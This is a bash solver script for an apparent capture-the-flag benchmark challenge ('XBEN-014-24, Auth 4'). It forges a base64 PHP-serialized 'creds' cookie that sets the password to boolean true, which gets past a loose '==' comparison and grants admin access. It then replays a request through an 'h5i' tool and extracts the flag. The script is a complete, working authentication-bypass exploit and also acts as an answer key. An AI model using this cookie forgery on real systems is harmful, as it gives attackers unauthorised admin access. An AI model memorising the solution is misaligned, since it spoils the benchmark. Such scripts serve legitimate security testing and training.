#!/usr/bin/env bash
# XBEN-014-24 — "Auth 4" (tags: insecure_deserialization, privilege_escalation)
#
# The `creds` cookie is base64 of a PHP serialized array, and the check is
# `$auth['password'] == $password` with PHP's loose `==`. A boolean `true`
# compares equal to any non-empty string, so the password never has to be known:
# serialize it as `b:1` instead of a string.
#
# The cookie is set by editing a stored request rather than by driving a login,
# because the application never issues this cookie itself. `--create` is what
# says so: the cookie is not there to change.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben014-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

CREDS="$(python3 -c "
import base64
# array('username' => 'admin', 'password' => true)
print(base64.b64encode(
    b'a:2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";b:1;}').decode())")"

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
REPLAY="$("$H5I" websec replay req_0 --set "cookie.creds=$CREDS" --create --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
